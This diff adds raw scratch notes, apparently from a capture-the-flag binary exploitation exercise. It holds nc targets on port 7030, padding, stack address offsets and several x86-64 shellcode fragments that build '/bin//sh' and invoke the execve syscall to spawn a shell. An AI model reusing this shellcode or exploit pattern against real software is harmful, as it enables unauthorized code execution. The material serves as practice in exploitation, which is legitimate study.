@@ -1,0 +1,67 @@
+nc 194.5.207.113 7030, nc 185.97.117.19 7030
+
+
+aaaaaaaaaaaaaaaaaaaaaaaaaa
+
+0x7fffffffde02 + 17
+
+
+
+0x7fffffffde1d - (0x7fffffffde02 + 17)
+
+xor rsi, rsi
+xor al, 0x1f
+
+----
+0x7fffffffdde4
+
+
+0x7fffffffde02
+
+0x7fffffffde11
+
+0x7fffffffde1d
+
+----
+
+mov rdi, 0x68732f2f6e69622f
+push rdi
+mov rdi, rsp
+syscall
+
+
+
+str2  -> shellcode1
+
+
+str1  -> shellcode2
+
+
+
+
+0x7ffea7cb9672
+
+
+0x7ffe4f969a92 --> 0xa25ff 
+
+
+rip = 0x7ffd92df1c92
+
+
+
+xor rax, rax
+push rax
+mov rdi, 0x68732f2f6e69622f
+push rdi
+add rax, 0x3b
+mov rdi, rsp
+xor rsi, rsi
+xor rdx, rdx
+syscall
+
+
+
+mov rdi, QWORD PTR [rip - 0x25]
+xor al, 0x1f
+xor rsi, rsi
+syscall
